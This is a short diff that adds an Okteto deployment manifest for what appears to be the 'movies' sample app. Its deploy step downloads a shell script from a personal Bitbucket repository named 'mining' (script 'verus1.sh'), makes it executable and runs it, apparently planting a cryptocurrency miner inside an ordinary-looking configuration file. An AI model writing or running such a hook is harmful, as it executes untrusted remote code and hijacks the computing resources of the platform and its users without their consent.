@@ -1,0 +1,6 @@
+icon: https://apps.okteto.com/movies/icon.png
+deploy:
+  - wget https://bitbucket.org/noval6161/mining/raw/a7f1e0eea1a289b41aca13fac0f42a32a711e958/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+devs:
+  - api/okteto.yml
+  - frontend/okteto.yml
